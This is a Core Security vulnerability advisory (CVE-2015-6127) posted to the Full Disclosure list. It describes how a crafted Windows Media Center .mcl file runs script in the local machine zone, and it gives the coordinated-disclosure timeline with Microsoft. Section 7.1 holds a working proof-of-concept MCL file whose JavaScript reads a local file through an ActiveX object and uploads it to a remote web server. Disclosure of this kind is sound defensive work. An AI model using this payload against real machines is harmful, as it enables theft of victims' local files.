@@ -1,0 +1,152 @@
+1. Advisory Information
+
+Title: Microsoft Windows Media Center link file incorrectly resolved reference
+Advisory ID: CORE-2015-0014
+Advisory URL: http://www.coresecurity.com/advisories/microsoft-windows-media-center-link-file-incorrectly-resolved-reference
+Date published: 2015-12-08
+Date of last update: 2015-12-04
+Vendors contacted: Microsoft
+Release mode: Coordinated release
+
+2. Vulnerability Information
+
+Class: Use of Incorrectly-Resolved Name or Reference [CWE-706]
+Impact: Information leak
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2015-6127
+
+ 
+
+3. Vulnerability Description
+
+The 'application' tag in Microsoft [1] Windows Media Center link files (.mcl extension) can include a 'run' parameter, which indicates the path of a file to be launched when opening the MCL file, or a 'url' parameter, which indicates the URL of a web page to be loaded within the Media Center's embedded web browser.
+
+A specially crafted MCL file having said 'url' parameter pointing to the MCL file itself can trick Windows Media Center into rendering the very same MCL file as a local HTML file within the Media Center's embedded web browser.
+
+4. Vulnerable Packages
+
+Windows 7 for x64-based Systems Service Pack 1 (with Internet Explorer 11 installed)
+Other versions are probably affected too, but they were not checked.
+
+5. Vendor Information, Solutions and Workarounds
+
+Microsoft posted the following Security Bulletin: MS15-134 [2]
+
+6. Credits
+
+This vulnerability was discovered and researched by Francisco Falcon from Core Exploits Team. The publication of this advisory was coordinated by Joaquín Rodríguez Varela from the Core Advisories Team.
+
+ 
+
+7. Technical Description / Proof of Concept Code
+
+The ehexthost.exe binary, part of Windows Media Center, loads the given URL into an embedded instance of Internet Explorer running in the local machine zone, but it doesn't opt-in for the FEATURE_LOCALMACHINE_LOCKDOWN IE security feature, therefore this situation can be leveraged by an attacker to read and exfiltrate arbitrary files from a victim's local filesystem by convincing him to open a malicious MCL file.
+
+The proof-of-concept shows an MCL file with embedded HTML + JS code, referencing itself in the 'url' parameter. Unlike what happens when loading a local HTML file into Internet Explorer 11, the JS code included here will automatically run with no prompts, and it will be able to read arbitrary local files using the MSXML2.XMLHTTP ActiveX object. Those read files then can be uploaded to an arbitrary remote web server.
+
+Also note that, in order for the PoC to work, the value of the 'url' parameter must match the name of the MCL file.
+
+7.1. Proof of Concept
+
+A new file should be created with the name "poc-microsoft.mcl" and with the following content:
+
+ 
+<application url="poc-microsoft.mcl"
+name="Showcase"
+bgcolor="RGB(255,255,255)"
+sharedviewport="false">
+<html>
+<head>
+<meta http-equiv="x-ua-compatible" content="IE=edge" >
+</head>
+<body>
+<script type="text/javascript">
+
+    function do_upload(fname, data){
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.open("POST", "http://192.168.1.50/uploadfile.php", true);
+        xmlhttp.setRequestHeader("Content-type", "multipart/form-data");
+        xmlhttp.setRequestHeader("Connection", "close");
+        xmlhttp.onreadystatechange = function(){if (xmlhttp.readyState == 4){alert(fname + " done.");}}
+        xmlhttp.send(new Uint8Array(data));
+    }
+
+
+    function read_local_file(filename){
+        /* Must use this one, XMLHttpRequest() doesn't allow to read local files */
+        var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
+        xmlhttp.open("GET", filename, false);
+        xmlhttp.send();
+        return xmlhttp.responseBody.toArray();
+    }
+
+
+    function upload_file(filename){
+        try{
+            do_upload(filename, read_local_file(filename));
+        }catch(e){
+            alert(filename + " error: " + e);
+        }
+    }
+
+
+    upload_file("file:///C:/Windows/System32/calc.exe");
+
+</script>
+</body>
+</html>
+
+</application>
+     
+ 
+
+8. Report Timeline
+
+2015-09-24: Core Security sent the first notification to Microsoft.
+2015-09-24: Microsoft acknowledged receipt of the email and requested a draft version of the advisory.
+2015-09-25: Core Security sent Microsoft the draft version of the advisory including a PoC.
+2015-09-25: Microsoft cased the report under MSRC 31305.
+2015-10-02: Core Security requested Microsoft provide a status update and confirmation of the reported bug.
+2015-10-02: Microsoft informed Core Security that they were able to reproduce the issue. They were still reviewing it to determine if they would address it in a security release.
+2015-10-07: Core Security requested Microsoft let us know once they made a decision.
+2015-10-08: Microsoft informed Core Security they would keep us updated.
+2015-10-26: Core Security asked Microsoft if there were any updates regarding the reported bug and if they had an estimated time of availability.
+2015-10-27: Microsoft informed Core Security that they would be pursuing a fix for the reported issue and are working on a release date for it.
+2015-11-05: Core Security asked Microsoft if they had determined a release date for the fix and a CVE ID to the reported vulnerability.
+2015-11-10: Microsoft informed Core Security that they were targeting the security fix for this issue in their December release. They also informed us that they assigned CVE-2015-6127 to this case.
+2015-11-11: Core Security thanked Microsoft for their reply and clarified that we would be publishing the advisory on Tuesday, the 8 of December, 2015.
+2015-11-12: Microsoft requested from Core Security the link where the advisory would be published and the name of the researcher that should appear in the acknowledgment.
+2015-11-13: Core Security informed Microsoft of the link and name that should appear in the acknowledgment.
+2015-11-16: Microsoft informed Core Security that they updated the CVE acknowledgment accordingly.
+2015-12-08: Advisory CORE-2015-0014 published.
+9. References
+
+[1] http://www.microsoft.com/. 
+[2] https://technet.microsoft.com/library/security/MS15-134.
+
+10. About CoreLabs
+
+CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+
+11. About Core Security
+
+Core Security enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.
+
+12. Disclaimer
+
+The contents of this advisory are copyright (c) 2015 Core Security and (c) 2015 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+13. PGP/GPG Keys
+
+This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+
+
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
+
